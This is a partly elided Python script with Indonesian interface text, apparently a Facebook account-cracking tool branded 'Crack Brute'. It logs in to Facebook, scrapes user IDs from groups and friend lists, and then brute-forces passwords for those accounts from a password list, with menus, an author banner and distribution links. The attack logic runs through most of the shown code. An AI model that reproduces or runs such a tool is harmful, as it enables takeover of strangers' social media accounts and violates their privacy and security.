...
def simpan():
	...
	if len(id_teman) != 0:
		...
		try:
			open(os.sys.path[0]+'/CBteman.txt','w').write('\n'.join(id_teman))
			tampil('\rh[!]Berhasil meyimpan \rcCBteman.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
def buka(d):
...
def login():
	global log
	us = inputD('[?]Email/NO HP/ID')
	pa = inputD('[?]Kata Sandi/Password')
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rh[*]Selamat datang di cb \rk%s\n\rh[*]Semoga berhasil '%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun checkpoint\n\rk[!]Coba Login dengan opera mini')
		keluar()
	else:
...
def saring_id_group0():
	...
	while 1:
		...
		tampil('\rh[*]Melihat')
		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp%3Bstart=0&amp%3BlistType=list_nonfriend&amp%3Brefid=18&amp%3B_rdc=1&amp%3B_rdr&_rdc=1&_rdr')
		...
		try:
			...
			tampil('\rm[!]Id salah ')
			continue
	tampil('\rh[*]Crack Id dari group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rm[*]Silahkan Login')
		login()
		if log == 0:
			keluar()
...
def idteman():
	...
	try:
		...
		if len(id_teman) != 0:
			tampil('\rm[!]Hanya Mendapat \rp%d id'%len(id_teman))
		else:
			tampil('\rm[!]Batal')
			keluar()
	while 1:
...
def crack(d):
	...
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?]Masukan alamat file passwordlist anda atau coba passwordlist kami dengan ketik list.txt')
			try:
		...
		for i in D:
			...
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi? coba Terka password yang umum digunakan(y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
...
def lanjutT():
	global fid_teman
	if len(fid_teman) != 0:
		i = inputD('[?]Riset Ulang Id Teman/lanjutkan yang ada (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_teman)
		else:
			os.remove(os.sys.path[0]+'/CBteman.txt')
			fid_teman = []
	return 0
def lanjutG():
	global fid_cgroup
...
def menu():
    ...
    | \rmC\rh       | |\   /| |     |\rmT\rh|
    | \__/\   | | | | | |     |	|
     \____/   |_| |_| |_|     |_|    \rk*\Tiren74n
 \rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*
# \rb *Crack Brute* \rc #
# \rh BY \rp Tiren74n \rc#
# \rh FB \rp  https://m.facebook.com/Tiren74n \rc#
# \rh GitHub \rp https://github.com/Tiren74n/cb.git \rc#
# \rh WA \rp https://chat.whatsapp.com/ECzzhYGcPGwLig0x4nJpQA \rc#
# \rm Semoga berhasil \rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*\rm*\rk*\rh*\rb*''')
	tampil('''\rc%s\n\rc1 \rh id dari group\n\rc2 \rb id dari daftar teman\n\rc3 \rm Keluar\n\rc%s'''%('#'*20,'#'*20))
